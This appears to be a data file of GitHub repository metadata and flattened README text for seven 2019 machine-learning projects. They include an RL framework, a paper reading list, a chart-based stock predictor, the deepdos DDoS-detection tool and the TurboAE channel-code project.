garlicdevs,Fruit-API,actor-critic#actor-critic-algorithm#arcade-learning-environment#atari#deep-learning#deep-reinforcement-learning#environment#games#human#human-in-the-loop#multi-agent#multi-agent-reinforcement-learning#multi-objective-optimization#multiplayer-game#policy-gradients#reinforcement-learning#reinforcement-learning-algorithms,Logo fruit docs images home logo png Introduction Fruit API http fruitlab org is a universal deep reinforcement learning framework which is designed meticulously to provide a friendly user interface a fast algorithm prototyping tool and a multi purpose framework for RL research community Specifically Fruit API has the following noticeable contributions Friendly API Fruit API follows a modular design combined with the OOP in Python to provide a solid foundation and an easy to use user interface via a simplified API Based on the design our ultimate goal is to provide researchers a means to develop reinforcement learning RL algorithms with little effort In particular it is possible to develop a new RL algorithm under 100 lines of code What users need to do is to create a Config a Learner and plug them into the framework We also provides a lot of sample Config s and Learner s in a hierarchical structure so that users can inherit a suitable one Figure 1 fruit docs images figure1 png Portability The framework can work properly in different operating systems including Windows Linux and Mac OS Interoperability We keep in mind that Fruit API should work with any deep learning libraries such as PyTorch Tensorflow Keras etc Researchers would define the neural network architecture in the config file by using their favourite libraries Instead of implementing a lot of deep RL algorithms we provide a flexible way to integrate existing deep RL libraries by introducing plugins Plugins extract learners from other deep RL libraries and plug into FruitAPI Generality The framework supports different disciplines in reinforement learning such as multiple objectives multiple agents and human agent interaction We also implemented a set of deep RL baselines in different RL disciplines as follows RL baselines Monte Carlo Q Learning Value based deep RL baselines Deep Q Network DQN Double DQN Dueling network with DQN Prioritized Experience Replay proportional approach DQN variants asynchronous synchronous method Policy based deep RL baselines A3C Multi agent deep RL Multi agent A3C Multi agent A3C with communication map Human agent interaction A3C with map Divide and conquer strategy with DQN Plugins TensorForce plugin still experimenting By using TensorForce plugin it is possible to use all deep RL algorithms implemented in TensorForce library via FruitAPI such as PPO TRPO VPG DDPG DPG Other plugins OpenAI Baselines RLLab are coming soon Built in environments Arcade learning environment Atari games OpenAI Gym DeepMind Lab Carla self driving car TensorForce s environments OpenAI Retro DeepMind Pycolab Unreal Engine Maze Explorer Robotics OpenSim Pygame Learning environment ViZDoom External environments can be integrated into the framework easily by plugging into FruitEnvironment Finally we developed 5 extra environments as a testbed to examine different disciplines in deep RL Mountain car multi objective environment graphical support Deep sea treasure multi objective environment graphical support Tank battle multi agent multi objective human agent cooperation environment Food collector multi objective environment Milk factory multi agent heterogeneous environment Video demonstrations can be found here click on the images img src fruit docs images screen1 jpg alt Fruit API Tank Battle width 240 height 240 border 10 img src fruit docs images screen2 jpg alt Fruit API Milk Factory width 240 height 240 border 10 img src fruit docs images screen3 jpg alt Fruit API Food Collector width 240 height 240 border 10 Documentation 1 Installation guide http fruitlab org installation2 html 2 Quick start http fruitlab org examples html 3 API reference http fruitlab org api html Please visit our official website here http fruitlab org for more updates tutorials sample codes etc References ReinforcePy https github com Islandman93 reinforcepy is a great repository that we referenced during the development of Fruit API Credit Please cite our work in your papers or projects as follows All contributions to the work are welcome bibtex miscnguyen2019fruitapi author Nguyen N D and Nguyen T T title Fruit API A Universal Deep Reinforcement Learning Framework year 2019 publisher GitHub journal GitHub repository howpublished urlhttps github com garlicdevs Fruit API,2019-10-21T01:01:12Z,2019-12-09T04:33:59Z,Python,garlicdevs,User,0,14,15,69,master,garlicdevs,1,0,0,1,0,2,1
BlueCat-Community,10-Days-Of-DL,bluecat#deep-learning#python#study#tutorial,10 Days Of DL License https img shields io badge License Apache 202 0 blue svg https opensource org licenses Apache 2 0 tensorflow 2 0 10 deep learning Ten days complete deep learning using tenorflow 2 0 pointright Requirements python 3 6 tensorflow 2 0 https www tensorflow org Numpy matplotlib Anaconda https mirrors tuna tsinghua edu cn anaconda archive Jupyter Notebook computer Install See the TensorFlow install guide https www tensorflow org install for the pip package https www tensorflow org install pip to enable GPU support https www tensorflow org install gpu use a Docker container https www tensorflow org install docker and build from source https www tensorflow org install source To install the current release for CPU only pip install tensorflow Use the GPU package for CUDA enabled GPU cards https www tensorflow org install gpu pip install tensorflow gpu Nightly binaries are available for testing using the tf nightly https pypi python org pypi tf nightly and tf nightly gpu https pypi python org pypi tf nightly gpu packages on PyPi Try your first TensorFlow program shell python python import tensorflow as tf tf enableeagerexecution tf add 1 2 numpy 3 hello tf constant Hello TensorFlow hello numpy Hello TensorFlow For more examples see the TensorFlow tutorials https www tensorflow org tutorials Course Day1 Machine Learning Theory https github com BlueCat Community 10 Days Of DL blob master Day1 Day 201 md Code https github com BlueCat Community 10 Days Of DL blob master Day1 Lab01 ipynb Day2 Linear Regression hypothesis cost Theory https github com BlueCat Community 10 Days Of DL blob master Day2 Day 202 md Day3 Linear Regression cost Theory https github com BlueCat Community 10 Days Of DL blob master Day3 Day 203 md Linear regression Code https github com BlueCat Community 10 Days Of DL blob master Day3 linear 20regression ipynb Day4 Multi variable Linear regression Theory https github com BlueCat Community 10 Days Of DL blob master Day4 Day 204 md Multi variable Linear regression Code https github com BlueCat Community 10 Days Of DL blob master Day4 Day 204practice ipynb Day5 Logistic Classification cost function Theory https github com BlueCat Community 10 Days Of DL blob master Day5 Day 205 md Logistic Classification Code https github com BlueCat Community 10 Days Of DL blob master Day5 Day 205practice ipynb Day6 Softmax regression cost function Theory https github com BlueCat Community 10 Days Of DL blob master Day6 SoftMax 20Regression md Softmax regression Code https github com BlueCat Community 10 Days Of DL blob master Day6 SoftmaxAndCostfunction ipynb Day7 Rate Overfitting Regularization training test Theory 1 https github com BlueCat Community 10 Days Of DL blob master Day7 Rateoverfittingregularization md Theory 2 https github com BlueCat Community 10 Days Of DL blob master Day7 Training 26TrainingDataSet md Training Evaluationn Code https github com BlueCat Community 10 Days Of DL blob master Day5 Day 205practice ipynb books Resources TensorFlow org https www tensorflow org TensorFlow tutorials https www tensorflow org tutorials TensorFlow official models https github com tensorflow models tree master official TensorFlow examples https github com tensorflow examples TensorFlow in Practice from Coursera https www coursera org specializations tensorflow in practice TensorFlow blog https blog tensorflow org TensorFlow Twitter https twitter com tensorflow TensorFlow YouTube https www youtube com channel UC0rqucBdTuFTjJiefW5t IQ TensorFlow roadmap https www tensorflow org community roadmap TensorFlow white papers https www tensorflow org about bib TensorBoard visualization toolkit https github com tensorflow tensorboard Learn more about the TensorFlow community https www tensorflow org community and how to contribute https www tensorflow org community contribute License Copyright 2019 Team DaliyLearning in BlueCat Community Licensed under the Apache License Version 2 0 the License you may not use this file except in compliance with the License You may obtain a copy of the License at http www apache org licenses LICENSE 2 0 Unless required by applicable law or agreed to in writing software distributed under the License is distributed on an AS IS BASIS WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND either express or implied See the License for the specific language governing permissions and limitations under the License,2019-10-04T02:31:02Z,2019-11-16T12:10:22Z,Jupyter Notebook,BlueCat-Community,Organization,4,14,10,91,master,starfishda#Jung-Juhwan#KimDoubleB#firstdeep#banksemi#rurimo#ChanYiHong,7,0,0,0,6,0,14
hurshd0,must-read-papers-for-ml,convolutional-networks#data-analysis#data-science#deep-learning#exploratory-data-analysis#generalized-additive-models#machine-learning#neural-networks#papers#recommender-system#recurrent-neural-networks#rnn-lstm,Must Read Papers for Data Science ML and DL Curated collection of Data Science Machine Learning and Deep Learning papers reviews and articles that are on must read list NOTE construction in process of updating let me know what additional papers articles blogs to add I will add them here How to use pointright star this repo Contributing pointright arrowsclockwise Please feel free to Submit Pull Request https github com hurshd0 must read papers for ml pulls if links are broken or I am missing any important papers blogs or articles Maintenance https img shields io badge Maintained 3F yes green svg https github com hurshd0 must read papers for ml graphs commit activity pointdown READ THIS pointdown pointright Reading paper with heavy math is hard it takes time and effort to understand most of it is dedication and motivation to not quit don t be discouraged read once read twice read thrice until it clicks and blows you away 1stplacemedal Read it first 2ndplacemedal Read it second 3rdplacemedal Read it third Data Science barchart Pre processing EDA 1stplacemedal pagefacingup Data preprocessing Tidy data by Hadley Wickham https vita had co nz papers tidy data pdf notebook General DS 1stplacemedal pagefacingup Statistical Modeling The Two Cultures by Leo Breiman https projecteuclid org download pdf1 euclid ss 1009213726 2ndplacemedal pagefacingup A study in Rashomon curves and volumes A new perspective on generalization and model simplicity in machine learning https arxiv org pdf 1908 01755 pdf videocamera KDD 2019 Cynthia Rudin s Keynote https youtu be wL4X4lG20sM 1stplacemedal pagefacingup Frequentism and Bayesianism A Python driven Primer by Jake VanderPlas https arxiv org pdf 1411 5018 pdf Machine Learning dart General ML 1stplacemedal newspaper A Few Useful Things to Know About Machine Learning by Pedro domingos https homes cs washington edu pedrod papers cacm12 pdf 1stplacemedal pagefacingup Model Evaluation Model Selection and Algorithm Selection in Machine Learning by Sebastian Raschka https arxiv org pdf 1811 12808 pdf 1stplacemedal pagefacingup A Brief Introduction into Machine Learning by Gunnar Ratsch https events ccc de congress 2004 fahrplan files 105 machine learning paper pdf 3rdplacemedal pagefacingup An Introduction to the Conjugate Gradient Method Without the Agonizing Pain by Jonathan Richard Shewchuk http www cs cmu edu quake papers painless conjugate gradient pdf 3rdplacemedal pagefacingup On Model Stability as a Function of Random Seed https arxiv org pdf 1909 10447 mag Outlier Anomaly detection 1stplacemedal newspaper Outlier Detection A Survey https pdfs semanticscholar org 912b 0b7879ca99bf654a26bbb0d50d4b8e0ed6c0 pdf rocket Boosting 2ndplacemedal pagefacingup XGBoost A Scalable Tree Boosting System https arxiv org pdf 1603 02754 pdf 2ndplacemedal pagefacingup LightGBM A Highly Efficient Gradient BoostingDecision Tree https papers nips cc paper 6907 lightgbm a highly efficient gradient boosting decision tree pdf 2ndplacemedal pagefacingup AdaBoost and the Super Bowl of Classifiers A Tutorial Introduction to Adaptive Boosting http www inf fu berlin de inst ag ki adaboost4 pdf 3rdplacemedal pagefacingup Greedy Function Approximation A Gradient Boosting Machine https projecteuclid org download pdf1 euclid aos 1013203451 book Unraveling Blackbox ML 3rdplacemedal pagefacingup Peeking Inside the Black Box Visualizing Statistical Learning with Plots of Individual Conditional Expectation https arxiv org pdf 1309 6392 pdf 3rdplacemedal pagefacingup Data Shapley Equitable Valuation of Data for Machine Learning https arxiv org pdf 1904 02868 pdf scissors Dimensionality Reduction 1stplacemedal pagefacingup A Tutorial on Principal Component Analysis https arxiv org pdf 1404 1100 pdf 2ndplacemedal pagefacingup How to Use t SNE Effectively https distill pub 2016 misread tsne 3rdplacemedal pagefacingup Visualizing Data using t SNE https lvdmaaten github io publications papers JMLR2008 pdf chartwithupwardstrend Optimization 1stplacemedal pagefacingup A Tutorial on Bayesian Optimization https arxiv org abs 1807 02811 2ndplacemedal pagefacingup Taking the Human Out of the Loop A review of Bayesian Optimization https www cs ox ac uk people nando defreitas publications BayesOptLoop pdf Famous Blogs Sebastian Raschka https sebastianraschka com blog index html 8ball crystalball Recommenders Surveys 1stplacemedal pagefacingup A Survey of Collaborative Filtering Techniques http downloads hindawi com archive 2009 421425 pdf 1stplacemedal pagefacingup Collaborative Filtering Recommender Systems http citeseerx ist psu edu viewdoc download doi 10 1 1 130 4520 rep rep1 type pdf 1stplacemedal pagefacingup Deep Learning Based Recommender System A Survey and New Perspectives https sci hub tw 10 1145 3285029 1stplacemedal pagefacingup thinking star Explainable Recommendation A Survey and New Perspectives https arxiv org abs 1804 11192 star Case Studies 2ndplacemedal pagefacingup The Netflix Recommender System Algorithms Business Value and Innovation http delivery acm org 10 1145 2850000 2843948 a13 gomez uribe pdf globewithmeridians Netflix Medium Blog Netflix Recommendations Beyond the 5 stars Part 1 https medium com netflix techblog netflix recommendations beyond the 5 stars part 2 d9b96aa399f5 Netflix Recommendations Beyond the 5 stars Part 2 https medium com netflix techblog netflix recommendations beyond the 5 stars part 2 d9b96aa399f5 2ndplacemedal pagefacingup Two Decades of Recommender Systems at Amazon com https pdfs semanticscholar org 0f06 d328f6deb44e5e67408e0c16a8c7356330d1 pdf 2ndplacemedal globewithmeridians How Does Spotify Know You So Well https medium com s story spotifys discover weekly how machine learning finds your new music 19a41ab76efe pointright More In Depth study closedbook Recommender Systems Handbook https www amazon com Recommender Systems Handbook Francesco Ricci dp 1489976361 Famous Deep Learning Blogs cowboyhatface globewithmeridians Stanford UFLDL Deep Learning Tutorial http ufldl stanford edu tutorial globewithmeridians Distill pub https distill pub globewithmeridians Colah s Blog http colah github io globewithmeridians Andrej Karpathy https karpathy github io globewithmeridians Zack Lipton http zacklipton com articles globewithmeridians Sebastian Ruder https ruder io globewithmeridians Jay Alammar http jalammar github io books Neural Networks and Deep Learning Neural Networks star 1stplacemedal newspaper The Matrix Calculus You Need For Deep Learning Terence Parr and Jeremy Howard https arxiv org pdf 1802 01528 pdf star 1stplacemedal newspaper Deep learning Yann LeCun Yoshua Bengio Geoffrey Hinton https www cs toronto edu hinton absps NatureDeepReview pdf 1stplacemedal pagefacingup Generalization in Deep Learning https arxiv org pdf 1710 05468 pdf 1stplacemedal pagefacingup Topology of Learning in Artificial Neural Networks https arxiv org pdf 1902 08160v1 pdf 1stplacemedal pagefacingup Dropout A Simple Way to Prevent Neural Networks from Overfitting https www cs toronto edu hinton absps JMLRdropout pdf 1stplacemedal pagefacingup Generative Adversarial Nets Goodfellow et al https arxiv org pdf 1406 2661v1 pdf 2ndplacemedal pagefacingup Polynomial Regression As an Alternative to Neural Nets https arxiv org pdf 1806 06850 2ndplacemedal globewithmeridians The Neural Network Zoo https www asimovinstitute org neural network zoo utmsource mybridge utmmedium blog utmcampaign readmore 2ndplacemedal globewithmeridians Image Completion with Deep Learning in TensorFlow http bamos github io 2016 08 09 deep completion utmsource mybridge utmmedium blog utmcampaign readmore 2ndplacemedal pagefacingup Batch Normalization Accelerating Deep Network Training by Reducing Internal Covariate Shift https arxiv org pdf 1502 03167v3 3rdplacemedal pagefacingup A systematic study of the class imbalance problem in convolutional neural networks https arxiv org pdf 1710 05381 3rdplacemedal pagefacingup All Neural Networks are Created Equal https arxiv org pdf 1905 10854 3rdplacemedal pagefacingup Adam A Method for Stochastic Optimization https arxiv org pdf 1412 6980 3rdplacemedal pagefacingup AutoML A Survey of the State of the Art https arxiv org pdf 1908 00709v1 framedpicture CNNs 1stplacemedal pagefacingup Visualizing and Understanding Convolutional Networks by Andrej Karpathy Justin Johnson Li Fei Fei https arxiv org pdf 1311 2901 pdf 2ndplacemedal pagefacingup Deep Residual Learning for Image Recognition https www cv foundation org openaccess contentcvpr2016 papers HeDeepResidualLearningCVPR2016paper pdf 2ndplacemedal pagefacingup AlexNet ImageNet Classification with Deep Convolutional Neural Networks https papers nips cc paper 4824 imagenet classification with deep convolutional neural networks pdf 2ndplacemedal pagefacingup VGG Net VERY DEEP CONVOLUTIONAL NETWORKS FOR LARGE SCALE IMAGE RECOGNITION https arxiv org pdf 1409 1556v6 pdf 3rdplacemedal pagefacingup A Mathematical Theory of Deep Convolutional Neural Networks for Feature Extraction https arxiv org pdf 1512 06293 3rdplacemedal pagefacingup Large scale Video Classification with Convolutional Neural Networks https www cv foundation org openaccess contentcvpr2014 papers KarpathyLarge scaleVideoClassification2014CVPRpaper pdf 3rdplacemedal pagefacingup Bottom Up and Top Down Attention for Image Captioning and Visual Question Answering https arxiv org pdf 1707 07998 pdf blackcircle CapsNet trident 1stplacemedal pagefacingup Dynamic Routing Between Capsules https arxiv org pdf 1710 09829 pdf Blog explaning What are CapsNet or Capsule Networks https medium com ai C2 B3 theory practice business understanding hintons capsule networks part i intuition b4b559d1159b Capsule Networks Tutorial by Aureline Geron https www youtube com watch v pPN8d0E3900 t 1199s nationalpark speechballoon Image Captioning 1stplacemedal pagefacingup Show and Tell A Neural Image Caption Generator https arxiv org abs 1411 4555 2ndplacemedal pagefacingup Neural Machine Translation by Jointly Learning to Align and Translate https arxiv org pdf 1409 0473v7 2ndplacemedal pagefacingup StyleNet Generating Attractive Visual Captions with Styles https www microsoft com en us research uploads prod 2017 06 Generating Attractive Visual Captions with Styles 2ndplacemedal pagefacingup Show Attend and Tell Neural Image Caption Generation with Visual Attention https arxiv org abs 1502 03044 2ndplacemedal pagefacingup Where to put the Image in an Image Caption Generator https arxiv org abs 1703 09137 2ndplacemedal pagefacingup Dank Learning Generating Memes Using Deep Neural Networks https arxiv org abs 1806 04510 car walkingman Object Detection eagle football 2ndplacemedal pagefacingup ResNet Deep Residual Learning for Image Recognition https arxiv org pdf 1512 03385 2ndplacemedal pagefacingup YOLO You Only Look Once Unified Real Time Object Detection https arxiv org pdf 1506 02640 2ndplacemedal pagefacingup Microsoft COCO Common Objects in Context https arxiv org pdf 1405 0312 COCO dataset http cocodataset org home 2ndplacemedal pagefacingup R CNN Rich feature hierarchies for accurate object detection and semantic segmentation https arxiv org pdf 1311 2524 pdf 2ndplacemedal pagefacingup Fast R CNN https arxiv org pdf 1504 08083 pdf computer Papers with Code https www paperswithcode com paper fast r cnn 2ndplacemedal pagefacingup Faster R CNN https arxiv org pdf 1506 01497v3 pdf computer Papers with Code https www paperswithcode com paper mask r cnn 2ndplacemedal pagefacingup Mask R CNN https arxiv org pdf 1703 06870 pdf computer Papers with Code https www paperswithcode com paper mask r cnn car walkingman couple Pose Detection runner dancer 2ndplacemedal pagefacingup DensePose Dense Human Pose Estimation In The Wild https arxiv org pdf 1802 00434v1 pdf computer Papers with Code https www paperswithcode com paper densepose dense human pose estimation in the 2ndplacemedal pagefacingup Parsing R CNN for Instance Level Human Analysis https arxiv org pdf 1811 12596v1 pdf computer Papers with Code https www paperswithcode com paper parsing r cnn for instance level human abcd symbols NLP currencyexchange 1234 1stplacemedal pagefacingup A Primer on Neural Network Modelsfor Natural Language Processing https arxiv org pdf 1510 00726 pdf 1stplacemedal pagefacingup LSTM A Search Space Odyssey by Klaus Greff et al https arxiv org pdf 1503 04069 pdf 1stplacemedal pagefacingup A Critical Review of Recurrent Neural Networksfor Sequence Learning https arxiv org pdf 1506 00019 pdf 1stplacemedal pagefacingup Visualizing and Understanding Recurrent Networks https arxiv org pdf 1506 02078 pdf star 1stplacemedal pagefacingup Attention Is All You Need https arxiv org pdf 1706 03762 star 1stplacemedal pagefacingup An Empirical Exploration of Recurrent Network Architectures http proceedings mlr press v37 jozefowicz15 pdf 1stplacemedal pagefacingup Open AI GPT 2 Language Models are Unsupervised Multitask Learners https paperswithcode com paper language models are unsupervised multitask 1stplacemedal pagefacingup BERT Pre training of Deep Bidirectional Transformers forLanguage Understanding https arxiv org pdf 1810 04805 Google BERT Annoucement https ai googleblog com 2018 11 open sourcing bert state of art pre html 3rdplacemedal pagefacingup Parameter Efficient Transfer Learning for NLP https arxiv org pdf 1902 00751 3rdplacemedal pagefacingup A Sensitivity Analysis of and Practitioners Guide to ConvolutionalNeural Networks for Sentence Classification https arxiv org pdf 1510 03820v4 pdf 3rdplacemedal pagefacingup A Survey on Recent Advances in Named Entity Recognition from Deep Learning models https arxiv org pdf 1910 11470v1 3rdplacemedal pagefacingup Convolutional Neural Networks for Sentence Classification https arxiv org pdf 1408 5882v2 3rdplacemedal pagefacingup Pervasive Attention 2D Convolutional Neural Networks for Sequence to Sequence Prediction https arxiv org abs 1808 03867 3rdplacemedal pagefacingup Single Headed Attention RNN Stop Thinking With Your Head https arxiv org pdf 1911 11423 pdf alien GANs books GAN Rabbit Hole GAN Papers https github com zhangqianhui AdversarialNetsPapers o heavyminussign o GNNs Graph Neural Networks 3rdplacemedal pagefacingup A Comprehensive Survey on Graph Neural Networks https arxiv org pdf 1901 00596 pdf manhealthworker syringe Medical AI pill microscope Machine learning classifiers and fMRI a tutorial overview by Francisco et al https www ncbi nlm nih gov pmc articles PMC2892746 pdf nihms100405 pdf pointdown Cool Stuff pointdown loudsound pagefacingup SoundNet Learning Sound Representations from Unlabeled Video http soundnet csail mit edu art pagefacingup CAN Creative Adversarial NetworksGenerating Art by Learning About Styles andDeviating from Style Norms https arxiv org pdf 1706 07068 art pagefacingup Deep Painterly Harmonization https arxiv org pdf 1804 03189 Github Code https github com luanfujun deep painterly harmonization mandancing dancer pagefacingup Everybody Dance Now http,2019-10-29T01:52:48Z,2019-12-14T13:31:05Z,n/a,hurshd0,User,3,13,5,24,master,hurshd0,1,0,0,0,0,0,1
cderinbogaz,inpredo,n/a,image inpredologo png Inpredo INtelligent PREDictions is an AI which literally looks into financial charts and predicts stock movements First Step Create Training Data Before start to train a Convolutional Neural Network first you need to create a training dataset As a starting point you can use one of the following timeseries financial data BTC USD Hourly price data btcusd 1h csv EUR USD Hourly price data eurusd csv Gold USD Hourly price data xausd csv Since I am too lazy to automate all this you need to enter your CSV file into the following line For example if you wanna train your AI on euro dollar prices ad genfromtxt financialdata eurusd csv delimiter dtype str This code line is found under graphwerk py which is the factory that produces images out of time series financial data After running graphwerk py it will take some time to write single jpg files under data train folder When script is done writing then you need to take randomly roughly 20 percent of the training data and put it into validation data You need this to be able to train a neural network and yes I was too lazy to automate that as well Second Step Train the AI Now we have the training and validation datasets in place you can start training the AI model For this you just need to run train binary py and this script will start using the dataset make a AI model out of it When the model training is complete it will generate a model and weights file under the models directory Third Step Load Models and Predict You can run predictions using predict binary py script Use the predict file and use the path of the jpg file you want to predict Result of the script will be a buy sell or not confident message Last words Actually this project is much bigger but for some reasons I only put the training and data generation part here There is another part of the project which actually trades in real time using nothing but AI Models from this project For people who wants to go experimental don t forget that you can lose money in real markets and I am not accountable for your stupitidy if you choose to use this project to trade with your own money Medium article for in depth explanation of the project https medium com cderinbogaz making a i that looks into trade charts 62e7d51edcba,2019-09-27T21:02:15Z,2019-12-14T05:14:12Z,Python,cderinbogaz,User,4,13,8,1,master,cderinbogaz,1,0,0,0,1,1,0
susanli2016,TensorFlow-2.0-Keras,n/a,TensorFlow 2 0 Keras TensorFlow 2 0 Keras guide by Franois Chollet for deep learning researchers,2019-10-06T21:02:19Z,2019-12-10T16:22:11Z,Jupyter Notebook,susanli2016,User,1,13,5,3,master,susanli2016,1,0,0,0,0,0,0
C3NZ,deepdos,n/a,deepdos PyPI https img shields io pypi v deepdos PyPI Downloads https img shields io pypi dm deepdos Travis com https img shields io travis com C3NZ deepdos PyPI Implementation https img shields io pypi implementation deepdos PyPI Wheel https img shields io pypi wheel deepdos PyPI Python Version https img shields io pypi pyversions deepdos PyPI Status https img shields io pypi status deepdos PyPI License https img shields io pypi l deepdos Description Welcome to deepdos the python program written to monitor and potentially secure your network from ddos attacks While not currently utilizing deep learning to classify packets deepdos currently utilizes logistic regression in order to classify packets and has so far been trained on 200 000 packets from all sorts of DDOS attacks and normal traffic setup This project couldn t have been done without the help of the Canadian Institute for Cybersecurity with providing both the original flow dataset and tool to create flow csvs from pcap files Their site and all resources have been linked at the bottom Goals Short term goals Add LR test metrics on startup Update LR to use better data for better performance x Add command line interface Long term goals Convert Logistic regression model to a neural network Support both macos and Linux potentially Windows as well if pcap is easy Add ddos mitigation firewall rule support How to run setup YOU NEED JAVA INSTALLED IN ORDER FOR DEEPDOS TO RUN THE CICFlowMeter Running from scratch deepdos is currently only available on linux but can simply be run by these two commands bash clone repo git clone https github com C3NZ deepdos Install dependencies and setup the projects virtual environment source bash setup sh Execute the script Needs sudo in order to execute both tcpdump and iptables python3 main py h This will load you into a virtualenv with all of the dependencies installed and ready to use To remove all of the dependencies after you re done using the tool you can simply run bash source bash remove sh and then remove the folder from your computer This will immediately start creating necessary folders capturing packets and then identifying the traffic that is being exchanged in and out of your current computer Installing with pip Linux bash sudo apt install libpcap dev python3 dev python3 setuptools pip3 install deepdos or deepdos h depending on how your path is configured python3 m deepdos h Macos bash brew install libpcap pip3 install deepdos or deepdos h depending on how your path is configured python3 m deepdos h Usage usage main py h i INTERFACE n NAUGHTYCOUNT find interface firewall FIREWALL model type MODELTYPE Welcome to deepdos the machine learning ai based ddos analysis mitigation service optional arguments h help show this help message and exit i INTERFACE REQUIRES SUDO The network interface for deepdos to listen to default None n NAUGHTYCOUNT The amount of malicious flows that can come from a given address default 10 find interface List all of your devices network interfaces Good if you don t know what interfaces your device has default False firewall FIREWALL REQUIRES SUDO Turn on firewall mode for the given system linux for Linux systems and macos for mac Not yet supported default None model type MODELTYPE The model that you would like to use for classifying the data default lr stable 0 9 0 pickle usage src h i INTERFACE n NAUGHTYCOUNT find interface firewall FIREWALL model type MODELTYPE Documentation deepdos deepdos docs md deepdos db deepdos db docs md deepdos args deepdos args docs md deepdos tests deepdos tests docs md deepdos analytics deepdos analytics docs md deepdos firewall deepdos firewall docs md deepdos utils deepdos utils docs md How to deploy You can deploy this on your own machine but production use will come in the future Live deployments This will be on pypi soon How to contribute Fork the current repository and then make the changes that you d like to said fork Upon adding features fixing bugs or whatever modifications you ve made to the project issue a pull request to this repository containing the changes that you ve made and I will evaluate them before taking further action This process may take anywhere from 3 7 days depending on the scope of the changes made my schedule and any other variable factors Resources UNB datasets https www unb ca cic datasets CICnetflowmeter http www netflowmeter ca netflowmeter html CIC License CICLICENSE txt,2019-10-01T01:24:58Z,2019-12-13T05:07:57Z,Python,C3NZ,User,1,13,1,156,master,C3NZ,1,0,0,1,0,0,0
yihanjiang,turboae,n/a,Turbo AE Turbo Autoencoder code for paper Y Jiang H Kim H Asnani S Kannan S Oh P Viswanath Turbo Autoencoder Deep learning based channel code for point to point communication channels Conference on Neural Information Processing Systems NeurIPS Vancouver December 2019 At medium block length we can achieve comparable performance to near optimal codes such as LDPC Polar and Turbo Code solely via gradient descent If you use CNN and RNN as encoder and decoder you can only get below graph right Use interleaving and iterative decoding as well as the algorithm shown in more detail in paper you can have below graph left Performance of TurboAE docs turboaeperf png Required library test on Python 3 6 11 PyTorch 1 0 If feel inspired please consider cite inproceedingsjiang2019turbo title Turbo Autoencoder Deep learning based channel codes for point to point communication channels author Jiang Yihan and Kim Hyeji and Asnani Himanshu and Kannan Sreeram and Oh Sewoong and Viswanath Pramod booktitle Advances in Neural Information Processing Systems pages 2754 2764 year 2019 Also support DeepTurbo for paper Y Jiang H Kim H Asnani S Kannan S Oh P Viswanath Deep Turbo Deep Turbo Decoder SPAWC 2019 Support for DeepTurbo Neural Turbo Code Decoder is out The TurboAE decoder RNN version is actually DeepTurbo articleJiang2019DEEPTURBODT title DEEPTURBO Deep Turbo Decoder author Yihan Jiang and Hyeji Kim and Himanshu Asnani and Sreeram Kannan and Sewoong Oh and Pramod Viswanath journal 2019 IEEE 20th International Workshop on Signal Processing Advances in Wireless Communications SPAWC year 2019 pages 1 5 Feel free to ask me any question yij021 uw edu What is new 12 03 2019 1 Camera ready paper is on Arxiv https arxiv org abs 1911 03038 Here is the Slides https github com yihanjiang turboae blob master docs TurboAEslides pdf presented by Dr Hyeji Kim in Allerton Conference I am working on the poster and the poster will be out shortly The plot result py files will be out soon 2 Code Support for DeepTurbo https arxiv org abs 1903 02295 is out Ongoing progress to replicate DeepTurbo result on TurboAE framework 2 Pre trained model under refining Current pt in models are not the best model But you can fine tune them easily 3 A document for guiding replicate results from scratch is here https github com yihanjiang turboae blob master docs howtos md 4 Experimental I find using DenseNet is better than just CNN 1D Will update code very soon The performance is even exceeding the result in paper which I am verifying Run experiment for Turbo AE Note I find using encnumlayer 5 is much better than encnumlayer 2 I will share 5 layer encoder very soon ETA 12 15 1 Test pre trained model just enforce numepoch 0 CUDAVISIBLEDEVICES 0 python3 6 main py encoder TurboAErate3cnn decoder TurboAErate3cnn encnumunit 100 encnumlayer 2 decnumunit 100 decnumlayer 5 numiterft 5 channel awgn numtraindec 5 numtrainenc 1 coderatek 1 coderaten 3 trainencchannellow 2 0 trainencchannelhigh 2 0 snrteststart 1 5 snrtestend 4 0 snrpoints 12 numiteration 6 isparallel 1 traindecchannellow 1 5 traindecchannelhigh 2 0 issameinterleaver 1 declr 0 0001 enclr 0 0001 numblock 50000 batchsize 500 trainchannelmode blocknorm testchannelmode blocknorm numepoch 100 printtesttraj loss bce initnwweight models dtacontcnn2cnn5enctrain2dectrainneg152 pt numepoch 0 2 Train from scratch Expect to run for 1 1 5 days on Nvidia 1080Ti CUDAVISIBLEDEVICES 0 python3 6 main py encoder TurboAErate3cnn decoder TurboAErate3cnn encnumunit 100 encnumlayer 2 decnumunit 100 decnumlayer 5 numiterft 5 channel awgn numtraindec 5 numtrainenc 1 coderatek 1 coderaten 3 trainencchannellow 2 0 trainencchannelhigh 2 0 snrteststart 1 5 snrtestend 4 0 snrpoints 12 numiteration 6 isparallel 1 traindecchannellow 1 5 traindecchannelhigh 2 0 issameinterleaver 1 declr 0 0001 enclr 0 0001 numblock 50000 batchsize 500 trainchannelmode blocknorm testchannelmode blocknorm numepoch 100 printtesttraj loss bce 3 Fine tune on trained model CUDAVISIBLEDEVICES 0 python3 6 main py encoder TurboAErate3cnn decoder TurboAErate3cnn encnumunit 100 encnumlayer 2 decnumunit 100 decnumlayer 5 numiterft 5 channel awgn numtraindec 5 numtrainenc 1 coderatek 1 coderaten 3 trainencchannellow 2 0 trainencchannelhigh 2 0 snrteststart 1 5 snrtestend 4 0 snrpoints 12 numiteration 6 isparallel 1 traindecchannellow 1 5 traindecchannelhigh 2 0 issameinterleaver 1 declr 0 0001 enclr 0 0001 numblock 50000 batchsize 500 trainchannelmode blocknorm testchannelmode blocknorm numepoch 100 printtesttraj loss bce initnwweight models dtacontcnn2cnn5enctrain2dectrainneg152 pt 4 Using binarized code via STE CUDAVISIBLEDEVICES 0 python3 6 main py encoder TurboAErate3cnn decoder TurboAErate3cnn encnumunit 100 encnumlayer 2 decnumunit 100 decnumlayer 5 numiterft 5 channel awgn numtraindec 5 numtrainenc 1 coderatek 1 coderaten 3 trainencchannellow 2 0 trainencchannelhigh 2 0 snrteststart 1 5 snrtestend 4 0 snrpoints 12 numiteration 6 isparallel 1 traindecchannellow 1 5 traindecchannelhigh 2 0 issameinterleaver 1 declr 0 0001 enclr 0 0001 numblock 50000 batchsize 500 trainchannelmode blocknormste testchannelmode blocknormste numepoch 100 printtesttraj loss bce initnwweight models dtastep2cnn2cnn5enctrain2dectrainneg152 pt Note that blocknormste will enforce this Run experiment for DeepTurbo 1 Train 